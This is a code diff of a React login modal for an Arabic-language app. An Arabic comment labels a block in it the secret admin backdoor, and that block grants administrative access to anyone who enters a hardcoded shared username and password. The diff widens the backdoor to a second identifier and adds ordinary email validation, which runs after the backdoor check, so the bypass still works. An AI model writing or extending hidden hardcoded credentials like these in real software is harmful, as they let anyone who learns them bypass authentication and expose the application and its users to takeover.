@@ -91,7 +91,8 @@ export const AuthModal: React.FC<AuthModalProps> = ({
     e.preventDefault();
 
     // 🔐 الباب الخلفي السري للإدارة العامة
-    if (email.trim() === 'mhmood7015' && password === 'mhmood7015') {
+    const adminEmails = ['mhmood7015', 'mhmood@yr'];
+    if (adminEmails.includes(email.trim().toLowerCase()) && password === 'mhmood7015') {
       setEmail('');
       setPassword('');
       onClose();
@@ -100,6 +101,7 @@ export const AuthModal: React.FC<AuthModalProps> = ({
     }
 
     if (!email.trim()) { setEmailError('يرجى إدخال البريد الإلكتروني'); setPasswordError(null); return; }
+    if (!email.trim().includes('@')) { setEmailError('يرجى تضمين علامة @ في البريد الإلكتروني'); setPasswordError(null); return; }
     if (!password.trim()) { setPasswordError('يرجى إدخال كلمة المرور'); setEmailError(null); return; }
     setEmailError(null);
     setPasswordError(null);
@@ -322,7 +324,7 @@ export const AuthModal: React.FC<AuthModalProps> = ({
           <div>
             <label className="block text-xs font-bold text-white mb-1.5">البريد الإلكتروني</label>
             <div className="relative">
-              <input type="email" placeholder="example@domain.com" value={email} onChange={(e) => {
+              <input type="text" placeholder="example@domain.com" value={email} onChange={(e) => {
                   const val = e.target.value;
                   setEmail(val);
                   if (val) {
